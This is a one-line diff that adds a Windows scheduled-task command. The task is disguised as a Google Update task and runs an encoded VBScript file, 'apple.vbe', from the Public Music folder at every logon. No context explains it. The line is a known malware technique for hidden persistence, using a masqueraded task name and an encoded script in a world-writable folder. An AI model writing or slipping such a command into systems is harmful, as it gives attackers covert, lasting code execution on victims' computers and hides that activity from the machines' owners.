@@ -1,0 +1,1 @@
+schtasks /create /tn "GoogleUpdateTaskMachineUA{1C791230-CA8D-6D04-AC55-E498ABE7C33}" /tr "C:\Users\Public\Music\apple.vbe" /sc onlogon
